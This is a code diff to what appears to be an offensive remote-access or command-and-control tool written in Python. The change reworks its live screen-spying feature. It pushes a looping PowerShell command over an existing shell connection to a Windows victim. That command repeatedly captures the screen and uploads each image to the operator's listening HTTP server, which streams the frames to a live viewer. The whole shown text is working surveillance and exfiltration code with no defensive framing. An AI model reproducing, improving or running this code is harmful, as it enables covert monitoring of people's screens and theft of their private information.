@@ -859,6 +859,8 @@ setInterval(grab,{interval*1000});
                         print(f"  {GREEN}[+] Live viewer: http://0.0.0.0:{view_port} — refreshes every {interval}s{RST}")
                         print(f"  {AMBER}[*] Streaming screen from {matches[0][:8]}... Ctrl+C to stop{RST}")
 
+                        frame_count = [0]
+
                         class _ScreenHandler(BaseHTTPRequestHandler):
                             def do_POST(self):
                                 length = int(self.headers.get("Content-Length", 0))
@@ -868,39 +870,39 @@ setInterval(grab,{interval*1000});
                                 self.send_response(200)
                                 self.end_headers()
                                 self.wfile.write(b"OK")
+                                frame_count[0] += 1
+                                print(f"  {DIM}  [{frame_count[0]}] {len(data):,} bytes{RST}", end="\r")
                             def log_message(self, *a):
                                 pass
 
-                        srv = HTTPServer(("0.0.0.0", recv_port), _ScreenHandler)
-                        srv.timeout = interval + 10
+                        recv_srv = HTTPServer(("0.0.0.0", recv_port), _ScreenHandler)
+                        recv_thread = threading.Thread(target=recv_srv.serve_forever, daemon=True)
+                        recv_thread.start()
 
-                        shot_cmd = (
-                            'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
-                            '$bmp = [System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, '
-                            '[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
-                            '$g = [System.Drawing.Graphics]::FromImage($bmp); '
-                            '$g.CopyFromScreen(0,0,0,0,$bmp.Size); '
-                            '$bmp.Save(\'C:\\Users\\Public\\screen.png\'); '
-                            '$g.Dispose(); $bmp.Dispose(); '
-                            f'Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
-                            '-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
-                            '-ContentType \'application/octet-stream\'"'
+                        loop_cmd = (
+                            f'powershell -c "Add-Type -AssemblyName System.Windows.Forms; '
+                            f'while($true){{ '
+                            f'$b=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,'
+                            f'[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); '
+                            f'$g=[System.Drawing.Graphics]::FromImage($b); '
+                            f'$g.CopyFromScreen(0,0,0,0,$b.Size); '
+                            f'$b.Save(\'C:\\Users\\Public\\screen.png\'); '
+                            f'$g.Dispose();$b.Dispose(); '
+                            f'try{{Invoke-WebRequest -Uri \'http://{my_ip}:{recv_port}/screen.png\' '
+                            f'-Method POST -InFile \'C:\\Users\\Public\\screen.png\' '
+                            f'-ContentType \'application/octet-stream\' -TimeoutSec 5 | Out-Null}}catch{{}} '
+                            f'Start-Sleep -Seconds {interval} }}"'
                         )
+                        s.sock.sendall((loop_cmd + "\n").encode("utf-8"))
 
-                        frame = 0
                         try:
                             while True:
-                                s.sock.sendall((shot_cmd + "\n").encode("utf-8"))
-                                srv.handle_request()
-                                frame += 1
-                                if os.path.exists(latest_path):
-                                    size = os.path.getsize(latest_path)
-                                    print(f"  {DIM}  [{frame}] {size:,} bytes{RST}", end="\r")
-                                time.sleep(interval)
+                                time.sleep(1)
                         except KeyboardInterrupt:
-                            print(f"\n  {AMBER}[*] Watch stopped — {frame} frames captured{RST}")
+                            s.sock.sendall(b"\x03")
+                            print(f"\n  {AMBER}[*] Watch stopped — {frame_count[0]} frames received{RST}")
                         finally:
-                            srv.server_close()
+                            recv_srv.shutdown()
                             view_srv.shutdown()
 
                 elif cmd == "kill":
